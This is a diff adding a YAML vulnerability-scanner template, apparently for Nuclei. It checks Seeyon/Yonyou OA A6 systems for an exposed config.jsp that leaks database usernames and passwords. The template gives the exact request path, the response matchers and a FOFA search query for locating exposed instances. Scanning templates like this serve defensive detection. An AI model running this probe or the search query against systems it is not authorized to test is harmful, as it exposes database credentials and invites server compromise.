@@ -1,0 +1,30 @@
+id: poc-local-oa-yonyou-a6-config-info-leak
+
+info:
+  name: poc-local-oa-yonyou-a6-config-info-leak
+  author: capiton
+  severity: medium
+  description: "致远OA A6-m等业务系统config.jsp处存在敏感信息泄漏漏洞，攻击者通过漏洞可获取数据库账户密码，导致服务器数据库失陷。"
+  reference:
+    - https://mp.weixin.qq.com/s/IR4nPRAwnE1-0VwI8xyGvw
+  metadata:
+    fofa-query: body="yyoa" && app="致远互联-OA"
+    Vulnerability-Impact: 用友a6
+  tags: yonyou,oa
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/trafaxserver/SystemManage/config.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "数据库用户名"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
